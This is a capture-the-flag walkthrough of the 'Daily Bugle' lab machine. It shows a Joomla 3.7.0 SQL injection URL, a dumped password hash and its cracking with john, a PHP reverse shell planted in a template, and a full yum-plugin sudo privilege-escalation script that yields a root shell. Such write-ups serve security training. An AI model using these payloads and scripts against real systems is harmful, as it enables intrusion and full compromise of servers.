**Daily Bugle***

***IP=10.10.206.138***

***Difficulty = Hard**

After scanning the IP with rustscan, I found 3 open ports:

22, 80, 3306

***Web Enumeration***

Opening the URL in browser, I found that it was using Joomla CMS also described in the room's description.
I scanned the URL with gobuster and nikto and no juicy directories were there.
In the homepage, we can find a blog about a robbery with text as:

```
The criminal we call "Spider-Man" is back at it, clearly as seen in the image, Spider-Man is nothing more than a criminal, and I have proof, Sure he saves people all the time for free with nothing in return, but a media company like this always has to exist.
```

So the answer to the first question would be SpiderMan.

For joomla enumeration, I used joomscan from OWASP. 
From there, I found out the version of Joomla CMS being used. 

Version: 3.7.0

Now I searched for any exploit for this version on searchsploit.
I found an SQLi exploit.

```
Joomla! 3.7.0 - 'com_fields' SQL Injection
```
Searchsploit had a text file telling about how we can exploit the vulnerability.

```
URL Vulnerable: http://10.10.206.138/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27
```

I found out a great exploit for this vulnerability: joomblah
On running this exploit with the URL, I got the table Users with its contents.

```
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```
I used john the ripper to crack the password.

Save the hash in a file, say hash.
Now run john hash --wordlist=<Path-to-rockyou>

It took me around 10-12 minutes to crack the password.
If you want to crack fast use:

```
sed -n '45000,50000p' <Path-to-rockyou> > pass.txt
```

It will store contents of rockyou from 45000-50000 in pass.txt.
And now use john with this wordlist.
We got the password for jonah as spiderman123.

It is also the Super user for the website.

Now login with these creds in the administrator directory of joomla.
To get a reverse shell, I went to templates and edited the index.php with a php reverse shell script.

Start a netcat listener on a terminal and click on preview template.
I got a reverse shell as apache user.

***User.txt***

To escalate privelleges from apache user to jjameson, I found out jjameson's password in /var/www/html/configuration.php page.
Now ssh into machine with jjameson creds.

User.txt is present in jjameson's home directory.

***Root.txt***

When I ran sudo -l, to see what files jjameson can run as root, i found that i can run yum as root.
A quick search on gtfobins, gave me an idea of how I can escalate my privelleges to root.

```
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
These commands will give root shell.

Now go to /root and get root.txt
